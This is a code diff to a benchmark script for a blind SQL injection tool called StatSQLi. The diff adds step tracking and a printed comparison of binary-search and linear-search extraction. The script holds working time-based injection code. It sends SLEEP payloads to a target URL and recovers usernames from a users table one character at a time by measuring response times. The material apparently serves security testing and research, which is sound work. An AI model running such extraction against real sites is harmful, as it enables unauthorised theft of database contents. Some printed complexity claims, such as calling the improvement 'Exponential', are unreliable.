@@ -18,6 +18,9 @@ import sys
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 from statsqli.main import StatSQLi
+from statsqli.extractor import BinarySearchExtractor
+from statsqli.traditional_extractor import TraditionalExtractor
+from statsqli.stats import TimingAnalyzer
 
 
 class BenchmarkRunner:
@@ -42,10 +45,11 @@ class BenchmarkRunner:
             'sqlmap': [],
             'manual': []
         }
+        self.process_comparison_data: Dict = {}
     
     def benchmark_statsqli(self) -> List[float]:
         """Benchmark StatSQLi extraction."""
-        print("[*] Benchmarking StatSQLi...")
+        print("[*] Benchmarking StatSQLi (Binary Search Method)...")
         times = []
         
         for i in range(self.iterations):
@@ -53,19 +57,37 @@ class BenchmarkRunner:
             start = time.time()
             
             try:
-                tool = StatSQLi(
-                    self.target_url,
-                    self.test_payload,
-                    delay=2.0,
-                    parallel=True
-                )
-                # Extract specific user by ID (user_id - 1 because LIMIT is 0-indexed)
-                result = tool.extract_string_custom(
-                    table="users",
-                    column="username",
-                    where_clause=f"id={self.user_id} LIMIT 0,1",
-                    max_length=20
-                )
+                # For first iteration, track steps for process comparison
+                track_steps = (i == 0)
+                
+                if track_steps:
+                    # Use extractor directly with step tracking
+                    analyzer = TimingAnalyzer()
+                    extractor = BinarySearchExtractor(
+                        self.target_url, self.test_payload, 2.0, analyzer, track_steps=True
+                    )
+                    result = extractor.extract_string(
+                        table="users",
+                        column="username",
+                        where_clause=f"id={self.user_id} LIMIT 0,1",
+                        max_length=20
+                    )
+                    self.process_comparison_data['statsqli_steps'] = extractor.steps
+                    self.process_comparison_data['statsqli_queries'] = extractor.total_queries
+                    self.process_comparison_data['statsqli_result'] = result
+                else:
+                    tool = StatSQLi(
+                        self.target_url,
+                        self.test_payload,
+                        delay=2.0,
+                        parallel=True
+                    )
+                    result = tool.extract_string_custom(
+                        table="users",
+                        column="username",
+                        where_clause=f"id={self.user_id} LIMIT 0,1",
+                        max_length=20
+                    )
                 
                 elapsed = time.time() - start
                 times.append(elapsed)
@@ -166,7 +188,7 @@ class BenchmarkRunner:
         Benchmark manual/traditional extraction (actual linear search).
         This represents traditional method: linear character search with threshold-based detection.
         """
-        print("[*] Benchmarking manual/traditional extraction...")
+        print("[*] Benchmarking manual/traditional extraction (Linear Search Method)...")
         times = []
         
         for i in range(self.iterations):
@@ -174,72 +196,89 @@ class BenchmarkRunner:
             start = time.time()
             
             try:
-                # Traditional method: linear search with simple threshold
-                session = requests.Session()
+                # For first iteration, track steps for process comparison
+                track_steps = (i == 0)
                 
-                # Extract base URL
-                if '?' in self.target_url:
-                    url = self.target_url.split('?')[0]
+                if track_steps:
+                    analyzer = TimingAnalyzer()
+                    extractor = TraditionalExtractor(
+                        self.target_url, self.test_payload, 2.0, analyzer
+                    )
+                    result = extractor.extract_string(
+                        table="users",
+                        column="username",
+                        where_clause=f"id={self.user_id} LIMIT 0,1",
+                        max_length=20
+                    )
+                    self.process_comparison_data['traditional_steps'] = extractor.steps
+                    self.process_comparison_data['traditional_queries'] = extractor.total_queries
+                    self.process_comparison_data['traditional_result'] = result
                 else:
-                    url = self.target_url
-                
-                # Establish baseline (simple average, no statistics)
-                baseline_times = []
-                baseline_payload = self.test_payload.format(condition="1=0")
-                for _ in range(5):
-                    req_start = time.time()
-                    try:
-                        session.get(url, params={'id': baseline_payload}, timeout=30)
-                    except requests.RequestException:
-                        pass
-                    baseline_times.append(time.time() - req_start)
-                baseline_avg = sum(baseline_times) / len(baseline_times)
-                threshold = baseline_avg + 1.5  # Simple threshold (1.5s above baseline)
-                
-                # Extract string using linear search (traditional method)
-                result = ""
-                max_length = 20
-                
-                for pos in range(1, max_length + 1):
-                    char_found = False
+                    # Traditional method: linear search with simple threshold
+                    session = requests.Session()
                     
-                    # Linear search through printable ASCII (32-126)
-                    for ascii_val in range(32, 127):
-                        # Test if character equals this ASCII value
-                        # Use same query as StatSQLi benchmark (extract specific user by ID)
-                        char_query = f"UNICODE(SUBSTR((SELECT username FROM users WHERE id={self.user_id} LIMIT 0,1), {pos}, 1))"
-                        condition = f"{char_query} = {ascii_val}"
-                        
-                        # Build payload
-                        if "SLEEP" in self.test_payload.upper():
-                            payload_template = re.sub(
-                                r'SLEEP\([0-9.]+\)',
-                                'SLEEP(2)',
-                                self.test_payload,
-                                flags=re.IGNORECASE
-                            )
-                            payload = payload_template.format(condition=condition)
-                        else:
-                            payload = self.test_payload.format(
-                                condition=f"({condition}) AND SLEEP(2)"
-                            )
-                        
-                        # Make request and measure time
+                    # Extract base URL
+                    if '?' in self.target_url:
+                        url = self.target_url.split('?')[0]
+                    else:
+                        url = self.target_url
+                    
+                    # Establish baseline (simple average, no statistics)
+                    baseline_times = []
+                    baseline_payload = self.test_payload.format(condition="1=0")
+                    for _ in range(5):
                         req_start = time.time()
                         try:
-                            session.get(url, params={'id': payload}, timeout=30)
+                            session.get(url, params={'id': baseline_payload}, timeout=30)
                         except requests.RequestException:
                             pass
-                        elapsed = time.time() - req_start
-                        
-                        # Simple threshold check (traditional method)
-                        if elapsed > threshold:
-                            result += chr(ascii_val)
-                            char_found = True
-                            break
+                        baseline_times.append(time.time() - req_start)
+                    baseline_avg = sum(baseline_times) / len(baseline_times)
+                    threshold = baseline_avg + 1.5  # Simple threshold (1.5s above baseline)
                     
-                    if not char_found:
-                        break  # End of string
+                    # Extract string using linear search (traditional method)
+                    result = ""
+                    max_length = 20
+                    
+                    for pos in range(1, max_length + 1):
+                        char_found = False
+                        
+                        # Linear search through printable ASCII (32-126)
+                        for ascii_val in range(32, 127):
+                            # Test if character equals this ASCII value
+                            char_query = f"UNICODE(SUBSTR((SELECT username FROM users WHERE id={self.user_id} LIMIT 0,1), {pos}, 1))"
+                            condition = f"{char_query} = {ascii_val}"
+                            
+                            # Build payload
+                            if "SLEEP" in self.test_payload.upper():
+                                payload_template = re.sub(
+                                    r'SLEEP\([0-9.]+\)',
+                                    'SLEEP(2)',
+                                    self.test_payload,
+                                    flags=re.IGNORECASE
+                                )
+                                payload = payload_template.format(condition=condition)
+                            else:
+                                payload = self.test_payload.format(
+                                    condition=f"({condition}) AND SLEEP(2)"
+                                )
+                            
+                            # Make request and measure time
+                            req_start = time.time()
+                            try:
+                                session.get(url, params={'id': payload}, timeout=30)
+                            except requests.RequestException:
+                                pass
+                            elapsed = time.time() - req_start
+                            
+                            # Simple threshold check (traditional method)
+                            if elapsed > threshold:
+                                result += chr(ascii_val)
+                                char_found = True
+                                break
+                        
+                        if not char_found:
+                            break  # End of string
                 
                 elapsed = time.time() - start
                 times.append(elapsed)
@@ -314,6 +353,10 @@ class BenchmarkRunner:
             if summary['manual']['mean'] != float('inf'):
                 speedup_manual = summary['manual']['mean'] / summary['statsqli']['mean']
                 print(f"[*] StatSQLi is {speedup_manual:.2f}x faster than manual/baseline")
+        
+        # Always show process comparison if available
+        if self.process_comparison_data:
+            self._print_process_comparison()
     
     def save_results(self, summary: Dict[str, Dict[str, float]], filename: str = "benchmark_results.json"):
         """Save results to JSON file."""
@@ -329,6 +372,130 @@ class BenchmarkRunner:
             json.dump(output, f, indent=2)
         
         print(f"\n[+] Results saved to {filename}")
+    
+    def _print_process_comparison(self):
+        """Print clear process comparison showing how StatSQLi vs Traditional injection works."""
+        print("\n\n" + "=" * 100)
+        print(" " * 30 + "INJECTION PROCESS COMPARISON")
+        print("=" * 100)
+        print("\nThis section shows exactly how StatSQLi (Binary Search) compares to")
+        print("Traditional (Linear Search) methods for extracting the first character.\n")
+        
+        statsqli_steps = self.process_comparison_data.get('statsqli_steps', [])
+        traditional_steps = self.process_comparison_data.get('traditional_steps', [])
+        statsqli_result = self.process_comparison_data.get('statsqli_result', '')
+        traditional_result = self.process_comparison_data.get('traditional_result', '')
+        
+        if not statsqli_steps or not traditional_steps:
+            print("[!] Process comparison data not available")
+            return
+        
+        # Get steps for first character position
+        position = statsqli_steps[0].get('position', 1) if statsqli_steps else 1
+        statsqli_pos_steps = [s for s in statsqli_steps if s.get('position') == position]
+        traditional_pos_steps = [s for s in traditional_steps if s.get('position') == position]
+        
+        # Show extracted results
+        print("─" * 100)
+        print(f"{'EXTRACTED RESULT:':^100}")
+        print("─" * 100)
+        print(f"StatSQLi extracted:    {statsqli_result}")
+        print(f"Traditional extracted: {traditional_result}")
+        print()
+        
+        # Show method comparison
+        print("─" * 100)
+        print(f"{'METHOD COMPARISON':^100}")
+        print("─" * 100)
+        print(f"\n{'STATSQLI (Binary Search)':^50} | {'TRADITIONAL (Linear Search)':^50}")
+        print("─" * 50 + " | " + "─" * 50)
+        print(f"{'Algorithm:':<20} Binary Search{'':<18} | {'Algorithm:':<20} Linear Search{'':<15}")
+        print(f"{'Approach:':<20} Divide & Conquer{'':<15} | {'Approach:':<20} Sequential Testing{'':<12}")
+        print(f"{'Complexity:':<20} O(log n) ~7 queries{'':<12} | {'Complexity:':<20} O(n) ~48 queries{'':<11}")
+        print(f"{'Speed:':<20} Fast{'':<27} | {'Speed:':<20} Slow{'':<27}")
+        print()
+        
+        # Show how it works
+        print("─" * 100)
+        print(f"{'HOW IT WORKS - STEP BY STEP':^100}")
+        print("─" * 100)
+        print(f"\n{'STATSQLI':^50} | {'TRADITIONAL':^50}")
+        print("─" * 50 + " | " + "─" * 50)
+        print(f"{'1. Start: Range [32-126]':<50} | {'1. Start: Test ASCII 32':<50}")
+        print(f"{'2. Test: Is char >= 79?':<50} | {'2. Test: Is char = 32?':<50}")
+        print(f"{'3. If YES: Search [80-126]':<50} | {'3. If NO: Test ASCII 33':<50}")
+        print(f"{'   If NO:  Search [32-78]':<50} | {'4. Continue: 34, 35, 36...':<50}")
+        print(f"{'4. Repeat: Split in half':<50} | {'5. Stop: When match found':<50}")
+        print(f"{'5. Result: ~7 queries':<50} | {'6. Result: ~48 queries avg':<50}")
+        print()
+        
+        # Show actual steps side-by-side
+        print("─" * 100)
+        print(f"{'ACTUAL EXTRACTION STEPS (First Character)':^100}")
+        print("─" * 100)
+        print(f"\n{'STATSQLI STEPS':^50} | {'TRADITIONAL STEPS':^50}")
+        print("─" * 50 + " | " + "─" * 50)
+        
+        max_steps = max(len(statsqli_pos_steps), len(traditional_pos_steps))
+        steps_to_show = min(max_steps, 12)  # Show up to 12 steps
+        
+        for i in range(steps_to_show):
+            statsqli_step = statsqli_pos_steps[i] if i < len(statsqli_pos_steps) else None
+            traditional_step = traditional_pos_steps[i] if i < len(traditional_pos_steps) else None
+            
+            # StatSQLi side
+            if statsqli_step:
+                mid = statsqli_step.get('mid', 'N/A')
+                result = "✓" if statsqli_step.get('result') else "✗"
+                range_info = f"[{statsqli_step.get('low', '?')}-{statsqli_step.get('high', '?')}]"
+                left = f"{i+1}. Test: >= {mid:3} {result:2} Range: {range_info}"
+            else:
+                left = ""
+            
+            # Traditional side
+            if traditional_step:
+                ascii_val = traditional_step.get('ascii_val', 'N/A')
+                result = "✓" if traditional_step.get('result') else "✗"
+                char = chr(ascii_val) if 32 <= ascii_val <= 126 else '?'
+                right = f"{i+1}. Test: = {ascii_val:3} ({char}) {result:2}"
+            else:
+                right = ""
+            
+            print(f"{left:<50} | {right:<50}")
+        
+        if len(traditional_pos_steps) > steps_to_show:
+            remaining = len(traditional_pos_steps) - steps_to_show
+            print(f"{'':<50} | {'... (' + str(remaining) + ' more steps)':<50}")
+        
+        # Efficiency summary
+        print("\n" + "─" * 100)
+        print(f"{'EFFICIENCY SUMMARY':^100}")
+        print("─" * 100)
+        
+        statsqli_queries = len(statsqli_pos_steps)
+        traditional_queries = len(traditional_pos_steps)
+        
+        print(f"\n{'Metric':<30} {'StatSQLi':>20} {'Traditional':>20} {'Improvement':>20}")
+        print("─" * 100)
+        print(f"{'Queries for 1st char:':<30} {statsqli_queries:>20} {traditional_queries:>20} ", end="")
+        if traditional_queries > 0 and statsqli_queries > 0:
+            speedup = traditional_queries / statsqli_queries
+            print(f"{speedup:.1f}× fewer")
+        else:
+            print("N/A")
+        
+        print(f"{'Time complexity:':<30} {'O(log n)':>20} {'O(n)':>20} {'Exponential':>20}")
+        print(f"{'Best case:':<30} {'~7 queries':>20} {'~32 queries':>20} {'~4.6× faster':>20}")
+        print(f"{'Worst case:':<30} {'~7 queries':>20} {'~95 queries':>20} {'~13.6× faster':>20}")
+        print(f"{'Average case:':<30} {'~7 queries':>20} {'~48 queries':>20} {'~6.9× faster':>20}")
+        
+        print("\n" + "=" * 100)
+        print(" " * 30 + "KEY TAKEAWAY")
+        print("=" * 100)
+        print("\nStatSQLi uses binary search to find characters in ~7 queries regardless")
+        print("of the character value, while traditional methods require testing each")
+        print("character sequentially (32, 33, 34... until found), averaging ~48 queries.")
+        print("\nThis makes StatSQLi 6-13× more efficient in terms of queries needed.\n")
 
 
 def main():
